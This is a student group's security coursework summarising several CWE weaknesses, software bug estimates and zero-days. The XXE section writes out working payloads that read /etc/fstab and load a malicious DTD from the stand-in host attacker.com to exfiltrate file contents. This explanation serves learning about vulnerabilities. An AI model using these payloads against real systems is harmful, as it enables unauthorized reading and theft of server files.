# Class 7 - TP Assignment 

## Group 14


### Question P1.1.1 - Common Weakness Enumeration (CWE)


**1. Improper Restriction of Operations within the Bounds of a Memory Buffer**

 - **Description**: Certain languages allow direct addressing of memory locations which can cause read or write operations 
 to be performed on memory locations that may be associated with program data, so an attacker can alter the code of the 
 program. 

 - **Modes of Introduction**: Architecture and Design, Implementation.

 - **Affected Languages**: 
 C (Often Prevalent);
 C++ (Often Prevalent);
 Class: Assembly (Undetermined Prevalence).

 - **Common Consequences**: In terms of Integrity, an attacker can change certain values of variables for example and in 
 confidentiality the attacker can have access to sensitive information that contains sensitive system information.  



**2. Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**

 - **Description**: The software does not render incorrectly user-controllable input before it is placed in output that can 
 be seen by other users. 

 - **Modes of Introduction**: Architecture and Design, Implementation.

 - **Affected Languages**: Class: Language-Independent.

 - **Affected Technologies**: Class: Web Based (Often Prevalent).

 - **Common Consequences**: In Access control the most common attack performed with cross-site scripting involves the 
 disclosure of information stored in user cookies and for Integrity, Confidentiality, Availability the attacker executes 
 unauthorized code or commands also create requests that can be mistaken for those of a valid user, compromise confidential 
 information, or execute malicious code on the end user systems for a variety of nefarious purposes.



**3. Improper Input Validation**

 - **Description**: When software does not validate input properly, an attacker is able to craft the input in a form that 
 is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which 
 may result in altered control flow, arbitrary control of a resource, or arbitrary code execution. 

 - **Modes of Introduction**: Architecture and Design, Implementation.

 - **Affected Languages**: Class: Language-Independent.

 - **Common Consequences**: In availability denial of service crash, exit, restart or resource consumption and in 
 confidentiality the attacker can read memory, files or directory, while in integrity the attacker can modify them and 
 execute unauthorized code or commands.



### Question P1.1.2 - CWE 17 (14+3): Improper Restriction of XML External Entity Reference


 - **Description**: The software processes an XML document that can contain XML entities with URIs that resolve to 
 documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output. 

 - **Modes of Introduction**: Implementation.

 - **Applicable Platforms**: In terms of languages, XML is affected. On Technologies, this problem affects Web based 
 technologies.

 - **Common Consequences**: In confidentiality the attacker can be able to access arbitrary files on the system and for 
 integrity use the DTD may include arbitrary HTTP requests that the server may execute, and for availability the software 
 could consume excessive CPU cycles or memory using a URI that points to a large file.


Following is a code example:

**Request**

```html
POST http://example.com/xml HTTP/1.1
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "file:///etc/fstab">;
]>
<foo>
  &bar;
</foo>
```
**Response**

```html
HTTP/1.0 500 Internal Server Error
File "file:///etc/fstab", line 3
lxml.etree.XMLSyntaxError: Specification mandate value for attribute system, line 3, column 15...
```

/etc/fstab is a file which contains some characters that look like XML, therefore this limits XML External Entity (XXE) in 
the following ways:
 - XXE can only be used to obtain files or responses that contain “valid” XML.
 - XXE cannot be used to obtain binary files.
Parameter entities are just like regular entities but only for use in Data Type Definitions. In the example below, a 
parameter entity is being used to define a general entity, which is then being called inside of the XML document.


**Request**

```html
POST http://example.com/xml HTTP/1.1
<!DOCTYPE data [
  <!ENTITY % paramEntity
  "<!ENTITY genEntity 'bar'>">
  %paramEntity;
]>
<data>&genEntity;</data>
```
**Expected Response**

```html
HTTP/1.0 200 OK
bar
```

With the above example in mind, an attacker can now take the theoretical CDATA example above and turn it into a working 
attack by creating a malicious DTD hosted on attacker.com/evil.dtd.


**Request**

```html
POST http://example.com/xml HTTP/1.1
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```


**Attacker DTD (attacker.com/evil.dtd)**

```html
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

When an attacker sends the above request, the XML parser will first attempt to process the %dtd parameter entity by making 
a request to http://attacker.com/evil.dtd The XML parser will load /etc/fstab and It will then wrap the contents of the 
file in <![CDATA[ ]]> tags using the %start and %end parameter entities respectively, and stores them in yet another 
parameter entity called %all. So the attacker can only use parameter entities inside of the DTD. The result is a response 
back to the attacker with the contents of the file (/etc/fstab) wrapped in CDATA tags.

This weakness appears, for example, on CVE-2012-3489.

### Question P1.2

**Facebook**:
		62 Millions SLOC
		Between 1.24 Millions - 12.4 Millions bugs

**Car Software**:
	100 Millions SLOC;
	Between 2 Millions – 20 Millions bugs;

**Linux 3.1**:
		15 Millions	SLOC;
		Between 300,000 - 3 Millions bugs;  

**Google Internet Services**:
		2 Billions SLOC;
		Between 40 Millions – 400 Millions bugs;


### Question P1.3

**Project (Design) Vulnerabilities**

 - *CWE-20 Improper Input Validation*

 This happens when the software doesn't validate input correctly, which allows ill-intended users to craft the input in 
 such a way 
 that the application is not expecting, which may result in altered control flow, arbitrary control of a resource or 
 arbitrary code 
 execution. An example of an attack such as this is SQL Injection which, by crafting the input passed to the application, 
 tries to 
 break the part of the code that receives the SQL Query, which may result in all the accounts being revealed, for example.

 This weakness can be corrected by sanitizing all input received from the user side, however, depending on how many 
 input-reading code 
 the application has, this can imply a considerable sized code alteration.


- *CWE-198: Use of Incorrect Byte Ordering*

 This vulnerability happens when the software receives input from an upstream component but doesn't account for byte 
 ordering when
 processing input, which will cause an incorrect value to be used.

 This can be avoided by establishing a standard when designing the application. To correct such weakness in an already
 implemented program would take a great amount of code changing, which would take a long time and could possibly insert bugs
 when altering so much code.


**Implementation Vulnerabilities**

 - *CWE-787: Out-of-bounds Write*

 This vulnerability happens when the software writes data past the end, or before the beginning, of the said buffer.
 This can result in corruption of data, the application crashing or even code execution.

 To avoid this, the developers should either use a language that takes care of the management of buffer limits, or checking 
 to see
 if every buffer limit calculation is correct. To correct a vulnerability like this it would imply verifying every part of 
 the code
 where buffers are used, which will take a very long time considering the size of most projects. However a problem of small 
 complexity considering the maths behind it are simple, the time it would take would be of considerable order.


 - *CWE-862: Missing Authorization*

 This is verified when the software does not check the authorization when an actor tries to access a resource or perform an 
 action.
 This means that uses are able to access data or perform actions that they shouldn't be allowed to, which can lead to 
 information disclosure, denial of service and code execution.

 To avoid such problem, it is always mandatory to check if the actor in cause has the authorization to access said data or 
 to perform the action requested. Again, the difficult part about correcting this would be the time to change a big amount 
 of code, however, the exploitation of this vulnerability would most probably bring great prejudice to the owner.


 **Operational Vulnerabilities**

 - *CWE-5: J2EE Misconfiguration: Data Transmission Without Encryption*

 Due to this vulnerability, information sent over a network can be compromised while in transit. An attacker may be able to 
 read or change the contents if the data are sent in plaintext or weakly encrypted.

 To avoid this situation, all the important configurations, especially one such as information encryption, should be
 checked before running the application.


 - *CWE-453: Insecure Default Variable Initialization*

Happens when the software, by default, initializes an internal variable with an insecure or less secure value than is
possible.

To solve this problem the developers should configure the software to initialize the variable with the most secure values
possible.

### Question P1.4

The term “zero-day” refers to a newly discovered software vulnerability,that the developer has just learned of. This means
that an official patch or update to fix the issue hasn’t been released yet.
So, “zero-day” refers to the fact that the developers have “zero days” to fix the problem that has just been exposed — and 
might have already been exploited by attackers.
Once the vulnerability becomes publicly known, the vendor has to work quickly to fix the issue to protect its users.
But the software vendor may fail to release a patch before hackers manage to exploit the security hole.













